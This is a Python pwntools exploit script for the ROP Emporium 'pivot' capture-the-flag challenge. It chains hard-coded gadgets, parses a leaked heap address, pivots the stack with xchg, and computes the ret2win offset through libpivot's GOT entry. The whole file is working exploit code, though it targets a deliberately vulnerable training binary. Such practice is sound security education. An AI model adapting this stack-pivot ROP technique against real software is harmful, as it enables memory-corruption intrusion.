#pwn0x80.github.io
# ROPE{a_placeholder_64byte_flag!}
# https://ropemporium.com/challenge/pivot.html


# 0x0000000000400a33 : pop rdi ; ret
# 0x00007ffff7babf10  -  1st input store txt

from pwn import*
buff = b'A' * 40
# 0x00000000004009bb : pop rax ; ret
pop_rax = p64(0x00000000004009bb)

# 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
mov_rax = p64(0x00000000004009c0)
# 0x00000000004009bd : xchg rax, rsp ; ret
xchag = p64(0x00000000004009bd)
# 0x00000000004007c8 : pop rbp ; ret
pop_rbp = p64(0x00000000004007c8)
# 0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
mov_ptr_rax = p64(0x00000000004009c0)
# 0x00000000004009c4 : add rax, rbp ; ret
add_rax_rbp = p64(0x00000000004009c4)
# 0x00000000004006b0 : call rax
call_rax = p64(0x00000000004006b0)

elf = ELF('pivot')
lib_pivot = ELF('libpivot.so')
p = process(elf.path)

ret2win = lib_pivot.sym.ret2win
foothold_func = lib_pivot.sym.foothold_function

win_offset = p64(ret2win - foothold_func)

# payload 2
foothold_func_got = p64(elf.got.foothold_function)
foothold_func_plt = p64(elf.plt.foothold_function)

response = p.recv()

# REGEX
regx = re.compile(r'0x............')


pivot_addr = regx.findall(response.decode())[0]
pivot_addr = (p64(int(pivot_addr, 16)))

payload_1 = b"".join([
    buff,
    pop_rax,
    pivot_addr,

    xchag
])

payload_2 = b"".join([
    foothold_func_plt,
    pop_rax,
    foothold_func_got,
    pop_rbp,
    win_offset,
    mov_ptr_rax,
    add_rax_rbp,
    call_rax
])

# raw_input()

p.sendline(payload_2)
response = p.recv()
print(response.decode())

p.sendline(payload_1)
response = p.recv()
print(response.decode())

p.interactive()
